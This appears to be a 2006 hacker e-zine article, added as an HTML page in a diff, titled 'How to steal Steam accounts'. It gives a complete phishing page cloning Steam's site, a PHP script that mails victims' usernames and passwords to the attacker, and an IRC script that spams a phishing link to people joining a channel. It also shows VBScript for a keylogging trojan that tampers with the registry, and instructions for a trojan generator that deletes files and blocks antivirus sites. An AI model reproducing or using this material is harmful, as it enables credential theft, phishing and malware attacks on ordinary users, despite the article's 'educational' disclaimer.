@@ -1,0 +1,406 @@
+<html><head><title>EOF ISSUE #0x01</title>
+<style fprolloverstyle>A:hover {color: #D1F2C4; text-decoration: none}</style></head>
+<body text="#E0E0E0" bgcolor="#131313" link="#BFBFBF" vlink="#BFBFBF" alink="#BFBFBF" style="font-size: 10pt">
+
+<pre><hr>|| Author: sk0r,Czybik/EOF || <a style="text-decoration: none" href="../mainmenu/articles.htm"><span style="text-decoration: none">Back to articles</span></a> ||<hr></pre>
+<pre>
+||How to
+||steal
+||Steam accounts
+||______________________________________
+------------------------------------------
+
++-----------------------------------------+
+|1: What is Steam?                        |+
+|2: About this tutorial                   |+
+|3: First way: PHISHING                   |+
+|4: Second way: KEYLOGGING                |+
+|5: Third way: CLIENTREGISTRY.BLOB        |+
+|6: Fourth way: ASTGEN VCK V1.1           |+
+|7: About me                              |+
++-----------------------------------------++
+ +++++++++++++++++++++++++++++++++++++++++++
+
++-----------------------------------------------------+
+|Author: sk0r/Czybik                                  |+
+|Translated by: SkyOut                                |+
++-----------------------------------------------------++
+ +++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
++-----------------------------------------------------+
+|www.sk0r-czybik.de.vu                                |+
+|www.eof-project.net                                  |+
++-----------------------------------------------------++
+ +++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+________________________________________________________________________________
+
+ =================
+|1: What is Steam?|
+ =================
+
+The Steam client is a program to play several online games, like Counter-Strike 1.6,
+Half-Life, Half-Life 2, Counter-Strike: Source, Day of Defeat and more... Because
+you can play every game being activated with the users account it became quite popular
+to steal such accounts. Steam has no security features to avoid such things, only the
+ClientRegistry.blob is encrypted. The moment you get access to the account data you
+can change things like Email, password and the security question and that's it, the
+account is yours.
+
+ ======================
+|2: About this tutorial|
+ ======================
+
+This tutorial was written by sk0r/czybik in 2006, it describes 4 different ways to
+steal the users account. It is necessary to be able to code in programming language for
+two ways, the fourth way is using a tool, which generates a source code for you, but
+not a binary file, so you must be able to use the interpreter of the language to
+get the final trojan horse to use. It will be explained, but it could be helpful to
+have some basic knowledge in that language. The best would be to be able to code in
+a language, for example, C/C++, C#, VB, asm or another one... When finished with this
+tutorial you should be able to steal accounts, but i am not responsible for the things
+you do with your knowledge then. This tutorial is for educational purposes only, not
+to harm anyone. The examples are not language specific and therefore should be
+understandable for anybody and if you are able to code in language you can code your
+own code doing the tasks needed to be done. If I show you a code example I will do this
+using VB-Script. For questions, suggestions, critics just write an Email to me (see below).
+
+ ======================
+|3: First way: PHISHING|
+ ======================
+
+The easiest way to get access to Steam accounts is via Phishing. This method is based on
+Social Engineering techniques, this means, that you trick the user and make him believe
+for example the fake page is true. Phishing is used with Emails and HTML-Files, let's
+look at some normal example: Mr.X gets some Email, which seems to be from eBay, in this
+Email he is asked to login to his account to update his account data. The site he
+is going to visit looks exactly like the one of eBay, so the user thinks all is okay
+and types in his account information, without recognizing the false URL. And that's it,
+now his informations are send to someone else. That's the way Phisher are working,
+I'll show you this now. Now make a HTML-File with the following code:
+
++------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+|																														 |
+|&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.1//EN&quot; &quot;http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd&quot;&gt;																		 |
+|&lt;html&gt;																														 |
+|																														 |
+|&lt;head&gt;																														 |
+|	&lt;title&gt;Steam Account Validation&lt;/title&gt;																									 |
+|	&lt;meta name=&quot;pishing&quot; value=&quot;steamaccount&quot;&gt;																								 |
+|	&lt;meta name=&quot;author&quot; name=&quot;sk0r.Czybik&quot;&gt;																									 |
+|	&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://www.steampowered.com/steampowered.css&quot;&gt;																		 |
+|	&lt;!-- css2 --&gt;																												 | 
+|	&lt;link rel=&quot;Shortcut Icon&quot; type=&quot;image/png&quot; href=&quot;/webicon.png&quot;&gt;																						 |
+|	&lt;script language=&quot;JavaScript&quot; src=&quot;nav.js&quot;&gt;&lt;/script&gt;																							 |
+|	&lt;link href=&quot;http://www.steampowered.com/rss.xml&quot; rel=&quot;alternate&quot; type=&quot;application/rss+xml&quot; title=&quot;Valve RSS News Feed&quot; /&gt;														 |
+|&lt;/head&gt;																													 |
+|																														 |
+|&lt;body&gt;																														 |
+|																														 |
+|&lt;!-- begin header --&gt;																												 |
+|&lt;div class=&quot;header&quot;&gt;																												 |
+|&lt;nobr&gt;&lt;a href=&quot;index.php&quot;&gt;&lt;img src=&quot;http://www.steampowered.com/img/steam_logo_onblack.gif&quot; align=&quot;top&quot; alt=&quot;[Steam]&quot; height=&quot;54&quot; width=&quot;152&quot;&gt;&lt;/a&gt;												 |
+|&lt;span class=&quot;navBar&quot;&gt;																												 |
+|	&lt;a href=&quot;http://storefront.steampowered.com/v2/&quot;&gt;&lt;img name=&quot;games&quot; valign=&quot;bottom&quot; height=&quot;22&quot; width=&quot;66&quot; src=&quot;http://www.steampowered.com/img/games.gif&quot;&gt;&lt;/a&gt; 									         |
+|																														 |
+|	&lt;a href=&quot;index.php?area=news&quot;&gt;&lt;img name=&quot;news&quot; valign=&quot;bottom&quot; height=&quot;22&quot; width=&quot;54&quot; src=&quot;http://www.steampowered.com/img/news.gif&quot;&gt;&lt;/a&gt;												 |
+|																														 |
+|	&lt;a href=&quot;http://www.steampowered.com/index.php?area=getsteamnow&quot;&gt;&lt;img valign=&quot;bottom&quot; height=&quot;22&quot; width=&quot;108&quot; src=&quot;http://www.steampowered.com/img/getSteamNow.gif&quot;&gt;&lt;/a&gt;								 |
+|																														 |
+|	&lt;a href=&quot;index.php?area=cybercafes&quot;&gt;&lt;img valign=&quot;bottom&quot; height=&quot;22&quot; width=&quot;95&quot; src=&quot;http://www.steampowered.com/img/cafes.gif&quot;&gt;&lt;/a&gt;													 |
+|																														 |
+|	&lt;a href=&quot;http://support.steampowered.com/&quot;&gt;&lt;img valign=&quot;bottom&quot; height=&quot;22&quot; width=&quot;68&quot; src=&quot;http://www.steampowered.com/img/support.gif&quot;&gt;&lt;/a&gt;												 |
+|																														 |
+|	&lt;a href=&quot;index.php?area=forums&quot;&gt;&lt;img valign=&quot;bottom&quot; height=&quot;22&quot; width=&quot;68&quot; src=&quot;http://www.steampowered.com/img/forums.gif&quot;&gt;&lt;/a&gt;													 |
+|																														 |
+|	&lt;a href=&quot;http://www.steampowered.com/status/status.html&quot;&gt;&lt;img valign=&quot;bottom&quot; height=&quot;22&quot; width=&quot;65&quot; src=&quot;http://www.steampowered.com/img/status.gif&quot;&gt;&lt;/a&gt;									         |
+|&lt;/span&gt;																													 |
+|&lt;/nobr&gt;																													 |
+|&lt;/div&gt;																														 |
+|&lt;!-- end header --&gt;																												 |
+|																														 |
+|																														 |
+|&lt;div class=&quot;content&quot; id=&quot;container&quot;&gt;																									         |
+|&lt;h1&gt;Account validation&lt;/H1&gt;																											 |
+|&lt;h2&gt;Please, &lt;em&gt;shortly, verify your account to play secure.&lt;/em&gt;&lt;/h2&gt;&lt;br&gt;																					 |
+|&lt;br&gt;																														 |
+|Dear Steam Subscriber,&lt;br&gt;																											 |
+|Because of the Hacking and Cheating in Steam Games Valve wants&lt;br&gt;																						 |
+|you to verify your account with your Cd-Key on the Steam servers.&lt;br&gt;																						 |
+|This is necessary because we must be sure that you own a legal&lt;br&gt;																						 |
+|buyed steam account. Please input your account data and click&lt;br&gt;																						 |
+|'Loging'. Then you will receive an email a few minutes later. This&lt;br&gt;                                  																	 |
+|email contain the result of the validation. If your result is positive,&lt;br&gt;																					 |
+|you can play again. &lt;br&gt;																											 |
+|&lt;br&gt;																														 |
+|																														 |
+|&lt;br&gt;																														 |
+|																														 |
+|&lt;style type=&quot;text/css&quot;&gt;																											 |
+|.div1 {																													 |
+|position: absolute;																												 |
+|top: 327px;																													 |
+|color:#BFBA50;																													 |
+|left: 15%;																													 |
+|width: 195px;																													 |
+|height: 150px;																													 |
+|border: 0px;																													 |
+|background-color: #4C5844;																											 |
+|}																														 |
+|&lt;/style&gt;																													 |
+|&lt;table cellpadding=&quot;8&quot;&gt;                        																								 |
+|&lt;tr&gt;																														 |																													 |
+|&lt;td&gt;																														 |
+|&lt;form action=&quot;senddata.php&quot; enctype=multipart/form-data method=&quot;post&quot; name=&quot;pishacc&quot;&gt;																				 |
+|                                                     Accountname: &lt;input type=&quot;text&quot; name=&quot;account&quot;&gt;&lt;br&gt;&lt;br&gt;                                                      Password:      &lt;input type=&quot;password&quot; name=&quot;passw&quot;&gt;                           |
+|&lt;br&gt;&lt;br&gt;                                                                                         &lt;input type=&quot;submit&quot; name=&quot;subAccPw&quot; value=&quot;     Login     &quot;&gt;&lt;/form&gt;&lt;br&gt;									 |
+|&lt;/td&gt;																														 |
+|&lt;td width=&quot;32px&quot;&gt; &lt;/td&gt;																											 |
+|&lt;/tr&gt;                                                   																							 |
+|&lt;/table&gt;																													 |
+|&lt;br&gt;&lt;br&gt;																													 |
+|&lt;hr style=&quot;width:95%;&quot;&gt;																											 |
+|																														 |
+|&lt;/div&gt;																														 |
+|																														 |
+|																														 |
+|&lt;!-- begin footer --&gt;																												 |
+|&lt;div class=&quot;footer&quot;&gt;																												 |
+|	&lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot;																									 |
+|	&lt;tr&gt;																													 |
+|		&lt;td&gt;&lt;a href=&quot;http://www.valvesoftware.com&quot;&gt;&lt;img src=&quot;http://www.steampowered.com/img/valve_greenlogo.gif&quot;&gt;&lt;/a&gt;&lt;/td&gt;														 |
+|		&lt;td&gt; &lt;/td&gt;																											 |
+|		&lt;td&gt;&lt;span class=&quot;footerfix&quot;&gt;&copy; 2006 Valve Corporation. All rights reserved. Valve, the Valve logo, Half-Life, the Half-Life logo, the Lambda logo, Steam, the Steam logo,                                                         |
+|		    Team Fortress, the Team Fortress logo, Opposing Force, Day of Defeat, the Day of Defeat logo, Counter-Strike, the Counter-Strike logo, Source, the Source logo and Counter-Strike:                                           |
+|                   Condition Zero are trademarks and/or registered trademarks of Valve Corporation. &lt;a href=&quot;http://www.valvesoftware.com/privacy.htm&quot;&gt;Privacy Policy&lt;/a&gt;. &lt;a href=&quot;http://www.valvesoftware.com/legal.htm&quot;&gt;Legal&lt;/a&gt;.          |
+|                   &lt;a href=&quot;http://www.steampowered.com//index.php?area=subscriber_agreement&quot;&gt;Steam Subscriber Agreement&lt;/a&gt;.&lt;/span&gt;&lt;/td&gt;													 |
+|		&lt;td width=&quot;15%&quot;&gt; &lt;/td&gt;																										 |
+|	&lt;/tr&gt;																													 |
+|	&lt;/table&gt;																												 |
+|&lt;/div&gt;																														 |
+|&lt;!-- end footer --&gt;																												 |
+|																														 |
+|&lt;script src=&quot;http://www.google-analytics.com/urchin.js&quot;																							 |
+|	type=&quot;text/javascript&quot;&gt;																											 |
+|	&lt;/script&gt;																												 |
+|	&lt;script type=&quot;text/javascript&quot;&gt;																										 |
+|	_uacct = &quot;UA-355860-1&quot;;																											 |
+|	urchinTracker();																											 |
+|	&lt;/script&gt;																												 |
+|                           																											 |
+|                                                                                                                                                                                                                                                |
+|&lt;/body&gt;                                                                                                                                                                                                                                         |
+|&lt;/html&gt;                                                                                                                                                                                                                                         |
+|                                                                                                                                                                                                                                                |
++------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+Save this document and look how similar it is to the style of Valves homepage. The
+good thing about phishing is, that you can copy the source code of the site you want
+to fake (Look at this example). Now you need a PHP-Script, which will take in the
+date typed by the user and send it via Mail() function to your Email, for example:
+
++-------------------------------------------------------------------------------------------------------------------------------------------------+
+|                                                                                                                                                 |
+|&lt;?                                                                                                                                               |
+|  $email=$_POST[account];                                                                                                                        |
+|  $password=$_POST[passw];                                                                                                                       |
+|  $Header = &quot;Hacked by sk0r / Czybik - www.sk0r-czybik.de.vu&quot;;                                                                                   |
+|                                                                                                                                                 |
+|if ($email==&quot;&quot; || $password==&quot;&quot;) {                                                                                                               |
+|    echo &quot;No Account data was given. Return &lt;a href=javascript:history.back(0)&gt;back&lt;/a&gt; to the form&quot;;                                            |
+|}                                                                                                                                                |
+|else {                                                                                                                                           |
+|        mail(&quot;yourmail@isp.com&quot;, &quot;Steam Account pishing&quot;, &quot;Accountname: $email&quot;.&quot; | &quot;.&quot;Accountpasswort: $password&quot;.&quot; | &quot;, $Header);              |
+|        echo &quot;&lt;center&gt;&lt;h1&gt;Error 404&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&quot;;                                                                                               |
+|        echo &quot;The page could not be found&lt;br&gt;&quot;;                                                                                                  |
+|        echo &quot;&lt;br&gt;&lt;br&gt;&quot;;                                                                                                                         |
+|        echo &quot;&lt;p style=color:white;&gt;Hacked by sk0r / Czybik&lt;/p&gt;&quot;;                                                                                |
+|}                                                                                                                                                |
+|?&gt;                                                                                                                                               |
+|																		  |
++-------------------------------------------------------------------------------------------------------------------------------------------------+
+
+This script will send you the account name and password, be sure to take a server, which is
+able to do this. Make sure the user is no recognizing it, otherwise he/she could
+change his account data before you receive the information. When you are finished
+with the HTML-File and the PHP-Script, load them up to a server and spread the link
+to it, for example via Email or IRC, I like Email most of course. To spread via IRC
+you could do a script that will message a user, when he joins the channel you are in,
+this could look like this:
+
++--------------------------------------------------------------------------------------------------------------------------------------------+
+|																	     |
+|On *:Join:#: {                                                                                                                              |
+|	/unset %vic                                                                                                                          |
+|	/unset %msg                                                                                                                          |
+|	set %vic = $nick                                                                                                                     |
+|	set %msg = Every steam user is asked to verify his account information --&gt; http://www.steampowered.de.ms                             |
+|	If (%vic != $me) { halt}                                                                                                             |
+|	/amsg %vic %msg                                                                                                                      |
+|}                                                                                                                                           |
+|                                                                                                                                            |
++--------------------------------------------------------------------------------------------------------------------------------------------+
+
+An Email would be much better of course, maybe with a faked sender, too. Using a
+HTML-Email is the best way to trick a user, it looks most realistic and similar to
+the original one and be sure if the user believes what he sees in the Email he will
+fill out the form on your page. Style, text and grammar are most important, if you
+have mistakes in the text and the style is different to the original one then the
+user will not believe it and it does not matter how good the text might be.
+You could send the Email to specific people, that have an account, about 25 names
+should be enough. You could also make a Spam-Bot searching through the internet for
+Emails, which are in a relation to Steam, that would be an even more professional
+way to start stealing accounts.
+
+ =========================
+|4: Second way: KEYLOGGING|
+ =========================
+
+A favoured way to get the users data is by getting him to execute a trojan horse,
+that will do some keylogging and send the data back to your Email. Steam has the
+feature to automatically login, so you first have to modify Steam that the user is
+forced to type in his password all time, when he wants to play. There are two possible
+ways to do this. The first would be to delete the ClientRegistry.blob file in the Steam
+directory, this will force the user to login with his password, the litte disadvantage
+is, that this file contains several other information and when deleted Steam has to
+update. That's why I don't recommend this one. The file can be find under:
+
++---------------------------------------------------------+
+|                                                         |
+|%installfolder%\Steam\ClientRegistry.blob                |
+|%installfolder%\Valve\Steam\ClientRegistry.blob          |
+|                                                         |
++---------------------------------------------------------+
+
+You can easily get the path via Registry:
+
++----------------------------------------------------------------------+
+|                                                                      |
+|HKEY_LOCAL_MACHINE\SOFTWARE\Valve\Steam\InstallPath                   |
+|                                                                      |
++----------------------------------------------------------------------+
+
+This one you can save to a variable and append the name (example in VB-Script):
+
++----------------------------------------------------------------------------------------------------+
+|                                                                                                    |
+|Set wshs = CreateObject(&quot;WScript.Shell&quot;)                                                            |
+|CheckSteam = wshs.regread(&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Valve\Steam\&quot; &amp; &quot;InstallPath&quot;)               |
+|If CheckSteam &lt;&gt;&quot;&quot; Then                                                                             |
+|ClientRegistry = CheckSteam + &quot;\ClientRegistry.blob&quot;						     |
+|End If												     |
+|												     |
++----------------------------------------------------------------------------------------------------+
+
+Now to the second way, the better one. You write a Registry value in the Steam key,
+forcing the user to log in every time he wants to access the games and it is recommended
+to stop Steam from automatically starting, it's better for the trojan horse:
+
++-------------------------------------------------------------------------------------------------+
+|                                                                                                 |
+|Set wshs = CreateObject(&quot;WScript.Shell&quot;)                                                         |
+|wshs.regwrite &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Steam&quot;, &quot;&quot;        |
+|wshs.regwrite &quot;HKEY_CURRENT_USER\Software\Valve\Steam\RefreshLoginRequired&quot;, 1, &quot;REG_DWORD&quot;      |
+|                                                                                                 |
++-------------------------------------------------------------------------------------------------+
+
+Make sure that &quot;RefreshLoginRequired is a REG_DWORD value. We're almost done with
+that. Now we should do some IF-Function, which will start the keylogging function,
+when Steam is active. Always overwrite those two Registry keys to make sure the user
+is not changing it manually while setting options in Steam. Now we have the password,
+but the user name is missing, but that is easy, Steam is creating one folder, named
+exactly like the users account name in the Steam directory, here some example code
+in VB-Script:
+
++-------------------------------------------------------------------+
+|                                                                   |
+|Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)               |
+|SteamApps = CheckSteam + &quot;\SteamApps&quot;                              |
+|Set GetNameFolders = fso.GetFolder (SteamApps)                     |
+|For Each Ordner in GetNameFolders                                  |
+|Accountname = Accountname + Ordner.name + Vbcrlf                   |
+|Next                                                               |
+|                                                                   |
++-------------------------------------------------------------------+
+
+Now we have account name and password. Now go on coding a trojan horse with the
+information i gave you, I recommend VB for this, its easy to code a such a program
+with it. The data could be send via PHP-Script or SMTP-Engine. For an example look
+at the source code of Win32.KillAvSteam.
+
+ =================================
+|5: Third way: CLIENTREGISTRY.BLOB|
+ =================================
+
+This is definitely the hardest way to get the users account data. The &quot;ClientRegistry.blob&quot;
+is an encrypted file, which is containing several options of Steam, account name and
+password, too. It is possible to get those information via this file, but until now
+it has not been tried or done. There are some tools out there, but they don't work
+well and just show up false informations.
+To get the informations with this technique you must know much more about the
+structure of this file. It seems to be a binary file, that would need to be converted
+first. It is also not known how the name and password are stored, as strin, as keycode,
+as encrypted string, which algorithm? All the question are not answered, yet. To
+answer them you must work for Valve or spend much time analyzing the file, you must
+have good knowledge in a high level language. If you are able to do all this, you can
+try writing a trojan horse doing all this and decrypting/converting the file to get
+the name and password. If you are at this point, just make a SMTP-Engine to send the
+information via Email to yourself, its possible...
+
+ ==============================
+|6: Fourth way: ASTGEN VCK V1.1|
+ ==============================
+
+This is the most easy way to steal the account information of someone else. With
+the Advanced Steam Trojan Generator v1.1 (Astgen1.1) you can create trojan horses
+source code, setting several specific options. The created program has a keylogging
+function and sends the information via a Email using a PHP-Script, which is generated 
+automatically, too. The source code is generated in Visual Basic, to compile it
+you need the file MS Visual Basic 6.0. I will explain now how to use this kit.
+First load the trojan from my site under &quot;Tools&quot;. When you are finished loading,
+execute the file &quot;Astgen1.1.exe&quot;, important to do: In the field &quot;Deine Emailadresse&quot;
+you have to type your own Email address, the collected information will be send there.
+In the field &quot;Link zum PHP-Skript&quot; you have to type in the link to the PHP-Script file,
+containing the form data (The generator creates two PHP-Scripts, one as a form, where
+the data is put into and another one sending the data via Mail() function). In the
+&quot;Form options&quot; section fill out everything but make sure that the &quot;Formname&quot; is not
+identical with the &quot;Processname&quot;. In the section Registry you can choose how the trojan
+horse should work, I recommend &quot;Use RefreshLoginRequired&quot; because the other one is
+deleting the &quot;ClienRegistry.blob&quot; again and again, forcing Steam to update all the
+time. This could irritate the user quite fast and is looking really suspicious.
+You can also decide whether you want to set the Registry values for hiding files
+and file extensions. In the section &quot;Application&quot; you can set the location, where
+the program shall copy to, when executed the first time (&quot;Make backup to&quot;). Under
+&quot;Keylogg times(minutes)&quot; you must decide how many minutes the program shall log
+data. Then you have to decide whether the trojan horse shall start logging since
+system start or when the &quot;Steam.exe&quot; gets executed, I recommend the second one.
+Then you have to set the number telling the program how often to log information,
+when this number is reached it will stop sending information to you or logging anything.
+If you like you can set an option, which will result in the deletion of important
+Steam files, when this number is reached (When the trojan horse has done its job),
+this will force the user to reinstall Steam. You could also display some message,
+text, title and icon can be set by you. Last, but not least you can decided whether
+the program shall block important CS and AV sites or not.
+Now click on &quot;Generieren&quot; and a new folder will be created, named &quot;Trojan-Source&quot;,
+it contains four files: &quot;Form-Source.php&quot;, which was set by the &quot;Link&quot; option, the
+&quot;phpemail.php&quot; file, this is the script sending you all files via Email, the
+&quot;SteamAccTrojan.frm&quot; file containing the source code and the &quot;Project1.vbp&quot; file,
+this is a project file, containing information about the Form file. Now open the
+file &quot;Project1.vbp&quot;, wait until everything is loaded and go to the left, &quot;File&quot;-&gt;
+&quot;Make Valve Patch - Steam.exe&quot;, a window will pop up asking for the location to save
+the final executable file. Your trojan horse shpould be ready now. If there was any
+error while compiling related to the source code, please write an Email to me with
+an error description, so I can fix it soon. Be creative, you could phishing in
+combination with the trojan horse for example and go on spreading your trojan now.
+To use &quot;Astgen1.1&quot; you must accept the disclaimer. Now load up the .php files to
+your webserver, they must be in the same directory, the &quot;Form-Source.php&quot; must be
+accessable exactly the way you typed it into the &quot;PHP-Skript&quot; field.
+
+ ===========
+|7: About me|
+ ===========
+
+For questions about this tutorial, malware or Steam feel free to write me an Email
+to sk0r1337@gmx.de or write something in my guestbook on my homepage, best regards
+sk0r/Czybik.
+</pre></body></html>
